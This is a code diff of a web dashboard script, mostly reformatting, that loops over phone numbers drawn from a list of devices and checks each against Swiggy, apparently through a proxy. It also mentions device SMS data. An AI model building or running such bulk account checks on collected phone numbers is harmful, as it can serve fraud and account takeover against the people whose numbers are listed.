+
+                    error.message
+
+                );
+
+
+                return {
+
+                    number,
+
+                    status:
+                        'error'
+
+                };
+
+            }
+
         }
+
+
+
+        /*
+        =========================================
+        START SWIGGY CHECK
+        =========================================
+        */
 
         async function startSwiggyCheck() {
-            if (isChecking) return;
-            
-            const btn = document.getElementById('checkSwiggyBtn');
-            const progressContainer = document.getElementById('progressContainer');
-            const progressFill = document.getElementById('progressFillMini');
-            const progressText = document.getElementById('progressTextMini');
-            
-            const items = getPhoneNumbersWithDeviceInfo();
-            
-            items.sort((a, b) => {
-                if (a.lastSeen > b.lastSeen) return -1;
-                if (a.lastSeen < b.lastSeen) return 1;
-                return 0;
-            });
-            
-            console.log(`📱 Found ${items.length} numbers to check`);
-            console.log(`🔄 Using proxy: ${PROXY_CONFIG.proxyUrl}`);
-            
-            if (items.length === 0) {
-                alert('No valid phone numbers found in devices.');
+
+            if (
+                isChecking
+            ) {
+
                 return;
+
             }
+
+
+            const btn =
+
+                document.getElementById(
+
+                    'checkSwiggyBtn'
+
+                );
+
+
+            const progressContainer =
+
+                document.getElementById(
+
+                    'progressContainer'
+
+                );
+
+
+            const progressFill =
+
+                document.getElementById(
+
+                    'progressFillMini'
+
+                );
+
+
+            const progressText =
+
+                document.getElementById(
+
+                    'progressTextMini'
+
+                );
+
+
+            const items =
+
+                getPhoneNumbersWithDeviceInfo();
+
+
+
+            items.sort(
+
+                (a, b) => {
+
+                    if (
+                        a.lastSeen >
+                        b.lastSeen
+                    ) {
+
+                        return -1;
+
+                    }
+
+                    if (
+                        a.lastSeen <
+                        b.lastSeen
+                    ) {
+
+                        return 1;
+
+                    }
+
+                    return 0;
+
+                }
+
+            );
+
+
+            if (
+
+                items.length === 0
+
+            ) {
+
+                alert(
+
+                    'No valid phone numbers found in devices.'
+
+                );
+
+                return;
+
+            }
+
+
 
             swiggyStatusMap = {};
-            allDevices.forEach(d => {
-                swiggyStatusMap[d.device_id] = 'checking';
-            });
-            renderDevices(allDevices);
+
+
+            allDevices.forEach(
+
+                device => {
+
+                    swiggyStatusMap[
+
+                        device.device_id
+
+                    ] =
+
+                        'checking';
+
+                }
+
+            );
+
+
+            renderDevices(
+
+                allDevices
+
+            );
+
 
             isChecking = true;
+
+
             btn.disabled = true;
-            btn.innerHTML = '<span class="spinner-small"></span> Checking...';
-            progressContainer.classList.add('active');
-            
+
+
+            btn.innerHTML =
+
+                '<span class="spinner-small"></span> Checking...';
+
+
+            progressContainer
+
+                .classList
+
+                .add(
+                    'active'
+                );
+
+
             let checked = 0;
 
-            for (let i = 0; i < items.length; i++) {
-                const item = items[i];
-                const { number, deviceId, deviceName } = item;
-                
-                const progress = ((i + 1) / items.length) * 100;
-                progressFill.style.width = `${progress}%`;
-                progressText.textContent = `${i + 1}/${items.length} (${deviceName})`;
-                
-                const result = await checkSwiggyNumber(number);
-                swiggyStatusMap[deviceId] = result.status;
-                renderDevices(allDevices);
+
+
+            for (
+
+                let i = 0;
+
+                i < items.length;
+
+                i++
+
+            ) {
+
+
+                const item =
+
+                    items[i];
+
+
+                const {
+
+                    number,
+
+                    deviceId,
+
+                    deviceName
+
+                } = item;
+
+
+
+                const progress =
+
+                    (
+                        (
+                            i + 1
+                        )
+
+                        /
+
+                        items.length
+
+                    )
+
+                    *
+
+                    100;
+
+
+
+                progressFill
+
+                    .style
+
+                    .width =
+
+                        `${progress}%`;
+
+
+
+                progressText
+
+                    .textContent =
+
+                        `${i + 1}/${items.length} (${deviceName})`;
+
+
+
+                const result =
+
+                    await checkSwiggyNumber(
+
+                        number
+
+                    );
+
+
+
+                swiggyStatusMap[
+
+                    deviceId
+
+                ] =
+
+                    result.status;
+
+
+
+                renderDevices(
+
+                    allDevices
+
+                );
+
+
                 checked++;
-                
-                // Small delay between requests
-                await new Promise(resolve => setTimeout(resolve, 100));
+
+
+
+                await new Promise(
+
+                    resolve =>
+
+                        setTimeout(
+
+                            resolve,
+
+                            100
+
+                        )
+
+                );
+
             }
 
-            progressFill.style.width = '100%';
-            progressText.textContent = `✅ Complete! Checked ${checked} numbers`;
-            
+
+
+            progressFill
+
+                .style
+
+                .width =
+
+                    '100%';
+
+
+
+            progressText
+
+                .textContent =
+
+                    `✅ Complete! Checked ${checked} numbers`;
+
+
+
             isChecking = false;
+
+
             btn.disabled = false;
-            btn.innerHTML = '🔍 Check Swiggy';
-            
-            setTimeout(() => {
-                progressContainer.classList.remove('active');
-            }, 3000);
+
+
+            btn.innerHTML =
+
+                '🔍 Check Swiggy';
+
+
+
+            setTimeout(
+
+                () => {
+
+                    progressContainer
+
+                        .classList
+
+                        .remove(
+
+                            'active'
+
+                        );
+
+                },
+
+                3000
+
+            );
+
         }
 
+
+
+        /*
+        =========================================
+        INITIAL LOAD
+        =========================================
+        */
+
         loadData();
-        setInterval(loadData, 30000);
+
+
+
+        /*
+        =========================================
+        REFRESH DEVICES EVERY 30 SECONDS
+
+        Only users.json is downloaded.
+        SMS data is NOT downloaded.
+        =========================================
+        */
+
+        setInterval(
+
+            loadData,
+
+            30000
+
+        );
+
     </script>
+
 </body>
+
 </html>
